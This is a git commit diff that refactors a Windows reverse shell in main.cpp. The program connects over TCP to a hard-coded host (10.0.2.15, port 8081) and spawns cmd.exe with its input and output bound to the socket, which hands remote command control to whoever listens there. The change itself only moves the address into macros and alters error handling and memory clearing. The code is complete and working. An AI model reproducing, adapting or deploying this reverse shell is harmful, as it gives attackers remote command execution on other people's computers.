881f43b2c6a933704c36f338044c8567abddc3d3
Joaquim Pedroza <71528875+Very-Bad-Goose@users.noreply.github.com>
2023-03-08 12:08:56 -0800

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -5,6 +5,9 @@
 #include <ws2tcpip.h>
 #pragma comment(lib, "Ws2_32.lib")
 
+#define IP_ADDRESS "10.0.2.15"
+#define PORT 8081
+
 int main()
 {
     SOCKET shell;
@@ -13,32 +16,30 @@ int main()
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     int connection;
-    char ip_addr[] = "10.0.2.15";
-    int port = 8081;
     char RecvServer[512];
 
     // initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-        printf("(!) Failed to initialize Winsock\n");
+        perror("WSAStartup failed");
         return 1;
     }
 
     // create a TCP socket
     if ((shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL)) == INVALID_SOCKET) {
-        printf("(!) Failed to create socket\n");
+        perror("Failed to create socket");
         WSACleanup();
         return 1;
     }
 
     // set up the socket address structure
-    shell_addr.sin_port = htons(port);
+    shell_addr.sin_port = htons(PORT);
     shell_addr.sin_family = AF_INET;
-    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
+    shell_addr.sin_addr.s_addr = inet_addr(IP_ADDRESS);
 
     // connect to the server
     if ((connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL)) == SOCKET_ERROR)
     {
-        printf("(!) Connection to the target server failed\n");
+        perror("Connection to the target server failed");
         WSACleanup();
         return 1;
     }
@@ -47,7 +48,7 @@ int main()
     recv(shell, RecvServer, sizeof(RecvServer), 0);
 
     // set up the STARTUPINFO structure for spawning a command prompt window
-    memset(&si, 0, sizeof(si));
+    SecureZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
     si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; // pipes stdin, stdout and stderr to socket
@@ -55,7 +56,7 @@ int main()
     // spawn cmd.exe process
     if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, true, 0, NULL, NULL,&si, &pi))
     {
-        printf("(!) Failed to spawn cmd.exe process\n");
+        perror("Failed to spawn cmd.exe process");
         WSACleanup();
         return 1;
     }
@@ -66,7 +67,7 @@ int main()
     // clean up resources
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    memset(RecvServer, 0, sizeof(RecvServer));
+    SecureZeroMemory(RecvServer, sizeof(RecvServer));
     WSACleanup(); // clean up Winsock resources
 
     return 0;
